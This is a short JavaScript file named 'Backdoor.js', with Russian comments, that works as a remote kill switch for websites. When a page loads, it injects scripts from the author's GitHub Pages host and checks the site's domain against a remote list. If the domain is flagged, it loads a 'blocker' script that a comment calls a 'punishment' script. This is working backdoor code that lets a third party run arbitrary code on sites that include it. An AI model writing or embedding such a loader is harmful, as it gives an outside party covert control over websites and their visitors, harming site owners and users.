/*!
 * Backdoor.js v1.0.1
 * (c) 2024-2024
 * by Deus Notam
 * Telegram → https://t.me/d3usn0tam
 */

// Проверка, был ли ранее подключен файл
if (!window.D3usN0tamProtect) {
  
  console.log("D3usN0tam System - Connected!\n\nMade by D3us N0tam\nNotion Site → https://deusnotam.notion.site/D3usN0tam-System-ba149f69de214fd3ba0b9df834eb2c6e?pvs=4\nTelegram → https://t.me/d3usn0tam");

  // Подключение datasite.js - база данных сайтов
  var datasiteScript = document.createElement('script');
  datasiteScript.src = 'https://deusnotam.github.io/datasite.js';
  document.head.appendChild(datasiteScript);

  // Подключение activator.js - скрипт проверки подключения
  var activatorScript = document.createElement('script');
  activatorScript.src = 'https://deusnotam.github.io/activator.js';
  document.head.appendChild(activatorScript);
  
  datasiteScript.onload = function() {
  const sites = site;

  function checkDomain() {
    const currentDomain = window.location.hostname;

    // Проверка, есть ли текущий домен в списке
    const siteInfo = sites.find(site => currentDomain === new URL(site.url).hostname);

    if (!siteInfo) {
        // Обработка случая, когда домен не найден в списке
        console.log("Сайт не найден в списке системы D3usN0tam.\nThe site was not found in the D3usN0tam system list.");
    } else {
        // Проверка, если blocker у домена равен "active"
        if (siteInfo.blocker === "active") {
            // Подключение blocker.js - скрипт наказаний, если домен найден в списке и blocker равен "active"
          var blockerScript = document.createElement('script');
          blockerScript.src = 'https://deusnotam.github.io/system/blocker/blocker.js';
          document.head.appendChild(blockerScript);
        }
    }
  }

// Вызов функции для проверки домена
checkDomain();
  };
  
  // Устанавливаем флаг, что файл подключен
  window.D3usN0tamProtect = true;
}
